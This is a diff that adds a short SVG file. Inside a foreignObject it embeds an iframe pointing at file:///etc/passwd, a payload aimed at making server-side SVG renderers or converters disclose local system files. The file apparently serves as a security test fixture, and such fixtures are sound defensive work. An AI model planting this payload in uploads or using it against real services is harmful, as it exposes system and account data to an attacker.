@@ -1,0 +1,7 @@
+<svg width="500" height="500"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+
+  <foreignObject width="2000" height="2000">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" src="file:///etc/passwd" width="2000" height="2000"/>
+  </foreignObject>
+</svg>
